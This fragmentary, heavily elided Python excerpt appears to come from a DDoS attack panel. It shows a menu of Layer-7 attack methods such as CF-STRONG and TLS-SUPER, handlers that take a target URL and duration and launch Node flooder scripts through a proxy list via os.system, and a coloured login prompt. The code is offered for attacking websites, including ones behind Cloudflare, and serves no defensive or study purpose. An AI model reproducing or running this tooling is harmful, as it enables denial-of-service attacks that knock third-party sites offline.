...
def l7():
   ...
   ''')
	...
	print('''
        ...
        \033[94m ║\033[37m•TLS-SUPER\033[94m    ║║\033[37m•CF-STRONG\033[94    ║║\033[37m•TLSV4     \033[94m ║
...
""")
		...
		elif sinput == "CF-STRONG":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node CFSTRONG.js {url} {time} 8 5 proxy.txt')
...
""")
			...
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node CF-FLOODER.js {url} {time} 512 5 proxy.txt')
...
""")
			...
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node HTTPS.js {url} {time} 512 5 proxy.txt')
...
\033[94;1m╔═══\033[94;1m[USERNAME\033[94;1m]\n╚══\x1b[38;2;0;255;189m> \033[97m""")
	password = getpass.getpass(prompt='\033[94;1m╔═══\033[94;1m[PASSWORD\033[94;1m]\n╚══\x1b[38;2;0;255;189m> \033[97m ')
